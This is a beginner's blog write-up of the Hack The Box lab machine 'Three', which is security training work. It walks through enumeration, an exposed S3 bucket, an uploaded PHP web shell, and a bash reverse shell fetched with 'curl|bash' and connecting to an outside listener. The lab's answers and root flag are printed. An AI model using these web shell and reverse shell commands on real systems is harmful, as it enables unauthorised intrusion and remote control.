---
title: "[HTB] Three"
author: "Wook Lee"
date: "2024-07-14"
tags: ["Hack The Box"]
---

<div style="text-align:center;"><img src="./sohard.gif"></div>

As I have mentioned earlier from the previous posting, I've finished all the boxes in Hack The Box Starting Point Tier 0 and have moved on to Tier 1 boxes. However, I feel a bit overwhelmed because the difficulty has suddenly increased a lot. To be clear, I want to mention that I will likely rely somewhat on the official write-ups provided by Hack The Box, including for this write-up and for future boxes. As a beginner, it's quite challenging and time-consuming to complete boxes of this level without any assistance, so I've concluded that it's better to get some help now and try to solve them on my own again later.

---

#### How many TCP ports are open?

```
2
```

```shell
┌──(kali㉿kali)-[/etc]
└─$ nmap -sC -sV --min-rate 3000 10.129.92.176 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-14 23:11 EDT
Nmap scan report for 10.129.92.176
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.21 seconds
```

<br>

#### What is the domain of the email address provided in the "Contact" section of the website?

```
thetoppers.htb
```

![alt text](image.png#center)

<br>

#### In the absence of a DNS server, which Linux file can we use to resolve hostname to IP addresses in order to be able to access the websites that point to those hostnames?

```
/etc/hosts
```

I added an entry for the `thetoppers.htb` in the `/etc/hosts` file with the corresponding IP address to be able to access this domain in the browser.
![alt text](image-1.png#center)

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
10.129.227.248 thetoppers.htb
```

<br>

#### Which sub-domain is discovered during further enumeration?

```
s3.thetoppers.htb
```

**_A subdomain_** name is a piece of additional information added to the beginning of a website's domain name. It allows websites to separate and organize content for a specific function. i.e. `ctf.hackthebox.com`. In this case, `ctf` is the subdomain, `hackthebox` is the primary domain and `com` is the top-level domain (TLD).

Often, different subdomains will have different IP addresses. It is also possible to have one server handle multiple subdomains. This is accomplished via `host-based routing` or `virtual host routing`, where the server uses the Host header in the HTTP request to determine which application is meant to handle the request.

Let's enumerate for any other sub-domains that may be present on the same server. Tools like `gobuster`, `wfuzz`, `feroxbuster`, and etc. are avilable for this purpose.

I used the `gobuster` to enumerate for sub-domains by running the following command:

`gobuster vhost --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb`

The output:

![alt text](image-2.png#center)

Let's also add the `s3.thetoppers.htb` entry in the `/etc/hosts` file.

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ echo "10.129.92.176 s3.thetoppers.htb" | sudo tee -a /etc/hosts
[sudo] password for kali:
10.129.92.176 s3.thetoppers.htb
```

<br>

#### Which service is running on the discovered sub-domain?

```
Amazon S3
```

I navigated to the newly found subdomain url and the only thing it shows is one JSON: `{"status": "running}`
![alt text](image-3.png#center)

Having researched about `s3 subdomain status running`, I found that `s3` is a cloud-based object storage service hosted by Amazon Web Services. It allows us to store things in containers called buckets. We can interact with the S3 bucket with the aid of the `awscli` utility.

<br>

#### Which command line utility can be used to interact with the service running on the discovered sub-domain?

```
awscli
```

First we need to configure it using the command, `aws configure` and then I used an arbitrary value, temp, for all the fields.

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ aws configure
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

We can list all of the S3 buckets hosted by the server by using the `ls` command.

`aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`

![alt text](image-4.png#center)

<br>

#### Which command is used to set up the AWS CLI installation?

```
aws configure
```

<br>

#### What is the command used by the above utility to list all of the S3 buckets?

```
aws s3 ls
```

<br>

#### This server is configured to run files written in what web scripting language?

```
PHP
```

As we can see from the `ls` command output, we see the files `index.php`, `.htaccess`, and a directory called `images` in the specified bucket. Therefore, we know the website server is using PHP.

![alt text](image-5.png#center)

<br>

#### Submit root flag

```
a980d99281a28d638ac68b9bf9453c2b
```

`awscli` has another feature that allows us to copy files to a remote bucket. We can try uploading a PHP shell file to the s3 bucket and since it's uploaded to the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we will achieve remote code execution.

We can use the following PHP one-liner which takes the URL parameter `cmd` as an input and executes it as a system command.

`<?php system($_GET["cmd"]); ?>`

Let's create a PHP file to upload

`echo '<?php system($_GET["cmd"]); ?>' > shell.php`

Then, we can upload this PHP shell to the `thetoppers.htb` S3 bucket using the following command:

`aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`

![alt text](image-6.png#center)

<br>

We can confirm that our shell is uploaded by navigating to `http://thetoppers.htb/shell.php`.

I tried executing the OS command `id` using the URL parameter cmd.
The response from the server contains the output of the OS command, id, which verified that we have code execution on the box.

![alt text](image-7.png#center)

<br>

Now let's get a reverse shell creating a new file `shell.sh` containing the following bash reverse shell payload which will connect back to our local machine on port `1337`.

```shell
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.28/1337 0>&1
```

And also start a `netcat` listener on our local port 1337 using the following command:

`nc lvnp 1337`

Let's also start a web server on our local machine on `port 8000` and host this bash file. It is crucial to note here that this command for hosting the web server **_must be run from the directory which contains the reverse shell file_**. So we must first traverse to the appropriate directory and then run the followign command:

`python3 -m http.server 8000`

<br>

We can use the `curl` utility to fetch the bash reverse shell file from our local host and then pipe it to `bash` in order to execute it.
Let's visit the following URL containing the payload in the browser.

`http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.28:8000/shell.sh|bash`

<br>

After we had run the payload, we were able to receive a reverse shell on the netcat terminal window.

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.10.14.28] from (UNKNOWN) [10.129.92.176] 41006
bash: cannot set terminal process group (1541): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/var/www/html$ ls
ls
images
index.php
shell.php
www-data@three:/var/www/html$ cd ..
cd ..
www-data@three:/var/www$ ls
ls
flag.txt
html
www-data@three:/var/www$ cat flag.txt
cat flag.txt
a980d99281a28d638ac68b9bf9453c2b
www-data@three:/var/www$
```

<br>

![alt text](image-8.png#center)
